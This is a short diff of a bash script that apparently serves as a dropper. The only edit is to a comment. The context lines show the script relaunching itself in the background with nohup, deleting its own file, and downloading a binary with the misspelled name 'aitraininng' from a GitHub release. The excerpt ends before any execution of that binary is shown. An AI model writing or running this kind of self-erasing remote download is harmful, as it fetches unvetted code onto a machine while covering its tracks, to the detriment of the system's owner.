@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Run the script in the background using nohup
+# Run the script in the background using nohup and redirect output to /dev/null
 nohup bash -c "
   ( sleep 1; rm -- \"$0\" ) &
   wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
